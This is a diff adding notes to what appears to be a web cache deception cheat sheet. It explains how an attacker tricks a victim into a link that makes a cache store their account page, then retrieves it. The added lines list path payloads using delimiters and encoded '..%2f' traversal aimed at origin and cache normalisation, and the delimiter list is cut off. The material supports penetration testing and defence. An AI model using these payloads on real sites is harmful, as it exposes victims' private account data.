@@ -1,3 +1,17 @@
+Metodology
+------------
+Web servers cache static files like ".js" and retrieve them from the cache if they are requested by other users. If the "x-cache" header returns "miss" in the response, it wasn't retrieved from the cache. If it returns "hit," it was retrieved from the cache. The logic here is to disguise a dynamic page as a static file/page and ensure its placement in the cache. For example, an attacker sends the victim the link "https://example.com/account#hack.js." The victim clicks the link, and the victim's information is stored in the server's cache. When the attacker visits the same link, they obtain the victim's information.
+
+
+Techniques
+-----------
+- /dynamic_page/asd.js
+- /dynamic_page<delimeter_list_parameter>asd.js >> for example /dynamic_page#asd.js
+- /resources/..%2fdynamic_page?asd >> origin server normalization
+- /dynamic_page%23%2f%2e%2e%2fresources?asd >> cache server normalization 
+
+Delimeter List
+---------------
 !
 "
 #
